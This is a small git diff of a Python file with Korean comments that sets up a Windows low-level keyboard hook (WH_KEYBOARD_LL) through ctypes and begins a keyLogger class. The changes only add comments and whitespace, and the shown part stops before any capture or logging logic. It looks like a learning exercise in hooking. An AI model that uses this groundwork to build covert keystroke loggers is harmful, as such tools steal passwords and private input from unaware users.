@@ -7,12 +7,16 @@ from ctypes.wintypes import DWORD
 
 # windll이라고 바로 객체의 dll 바이너리를 로드하는게 가능
 user32 = windll.user32
+
 kernel32 = windll.kernel32
+# other ## from ctypes._endian import windll
+# ##       kernel32 = windll.LoadLibrary("kernel32.dll")
+
 
 # 상수 선언
-WH_KEYBOARD_LL=13
-WM_KEYDOWN=0x0100
-CTRL_CODE = 162
+WH_KEYBOARD_LL=13 # 전역 키보드 후커
+WM_KEYDOWN=0x0100 # 0x100(키보드 누름 스캔 코드)
+CTRL_CODE = 162 # 162 (CTRL 스캔 코드)
 
 # 키보드 후킹을 위한 키로거 클래스 선언
 class keyLogger:
